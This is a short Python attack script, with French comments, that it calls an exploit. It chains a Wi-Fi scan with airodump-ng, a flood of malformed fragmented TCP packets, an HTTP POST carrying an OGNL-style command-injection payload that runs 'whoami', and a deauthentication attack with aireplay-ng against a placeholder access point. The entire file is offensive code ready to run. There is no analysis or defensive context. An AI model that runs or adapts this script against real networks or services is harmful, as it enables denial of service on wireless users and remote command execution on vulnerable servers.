import scapy.all as scapy
import subprocess
import time
import socket
import random
import os

# Configuration
target_ip = "127.0.0.1"
target_port = 7878
interface = "wlan0mon"  # Interface en mode moniteur
target_bssid = "00:11:22:33:44:55"  # Remplacer par le BSSID du point d'accès cible

# Fonction 1 : Scan Wi-Fi avec airodump-ng
def wifi_scan():
    print("Lancement du scan Wi-Fi...")
    subprocess.run(["airodump-ng", "--band", "abg", "-w", "scan_output", interface], timeout=10)
    print("Scan terminé. Vérifiez scan_output-01.csv pour les BSSID et canaux.")

# Fonction 2 : Envoi de paquets TCP fragmentés malformés
def fragmented_malformed_packet():
    ip = scapy.IP(dst=target_ip, flags="MF", frag=0)
    tcp = scapy.TCP(dport=target_port, sport=random.randint(1024, 65535), flags="SFU")
    payload = b"POST / HTTP/1.1\r\nHost: 127.0.0.1\r\n"
    packet = ip / tcp / payload
    fragments = scapy.fragment(packet, fragsize=10)
    for frag in fragments:
        scapy.send(frag, verbose=0)
        time.sleep(0.05)

# Fonction 3 : Injection de commande malveillante (HTTP)
def command_injection():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        malicious_payload = (
            b"POST / HTTP/1.1\r\n"
            b"Host: 127.0.0.1\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\n"
            b"Content-Length: 50\r\n"
            b"\r\n"
            b"cmd=${(#cmd='whoami').(#cmd)}\r\n"
        )
        s.send(malicious_payload)
        response = s.recv(1024)
        print(f"Response: {response.decode(errors='ignore')}")
        s.close()
    except Exception as e:
        print(f"Erreur lors de l'injection: {e}")

# Fonction 4 : Attaque de déauthentication Wi-Fi
def deauth_attack():
    print(f"Envoi de trames de déauthentication vers {target_bssid}...")
    subprocess.run([
        "aireplay-ng", "-0", "10", "-a", target_bssid, interface
    ], timeout=10)

# Exécuter l'exploit
if __name__ == "__main__":
    print("Démarrage de l'exploit...")
    wifi_scan()
    for _ in range(10):
        print("Envoi de paquets fragmentés...")
        fragmented_malformed_packet()
        time.sleep(random.uniform(0.1, 0.3))
    print("Envoi de l'injection de commande...")
    command_injection()
    print("Lancement de l'attaque de déauthentication...")
    deauth_attack()
    print("Exploit terminé.")